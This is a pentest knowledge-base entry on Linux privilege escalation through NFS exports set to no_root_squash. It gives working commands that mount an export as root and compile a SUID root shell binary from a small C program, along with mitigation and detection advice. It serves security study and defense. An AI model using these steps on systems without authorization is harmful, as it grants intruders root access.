---
topic: NFS — privilege escalation with `no_root_squash`
tags: [linux, nfs, privesc, suid, mount]
---

# NFS — privilege escalation with `no_root_squash`

[🌐 Español](nfs-no-root-squash.md) | **English**

## Concept

When an NFS export uses `no_root_squash`, the client keeps UID 0 on writes. Mounting the export as root allows creating a root-owned SUID binary and running it on the victim.

## When it applies

- An export with `no_root_squash` and write access.
- Port 2049 reachable and `showmount` enabled.
- Shared directories used by other users.

## Procedure

1. Enumerate exports with `showmount -e <HOST>`.
2. Mount the export locally as root.
3. Create an executable that spawns a shell.
4. Set root ownership and the SUID bit.
5. Run it from the victim.

## Commands

```bash
showmount -e <HOST>
mkdir -p /mnt/nfs && mount -t nfs <HOST>:/export /mnt/nfs
cat > /mnt/nfs/shell.c <<'EOF'
int main(){setuid(0);setgid(0);system("/bin/sh");}
EOF
gcc /mnt/nfs/shell.c -o /mnt/nfs/shell
chown root:root /mnt/nfs/shell && chmod 4755 /mnt/nfs/shell
```

## Variants

- A system cron or service running scripts from the export.
- Writing root's `authorized_keys`.
- NFSv4 with misconfigured permissions.

## Limitations

- `root_squash` maps UID 0 to `nobody`.
- The export may be mounted with `nosuid`.
- Write access is required.

## Mitigation

- Use `root_squash` and `all_squash`.
- Mount with `nosuid` and `noexec` where possible.
- Restrict exports by IP and authentication.

## Detection

- NFS mounts from uninventoried hosts.
- New SUID binaries on exports and executions from NFS.

## References

- <https://docs.kernel.org/filesystems/nfs/exporting.html>
- <https://attack.mitre.org/techniques/T1548/>
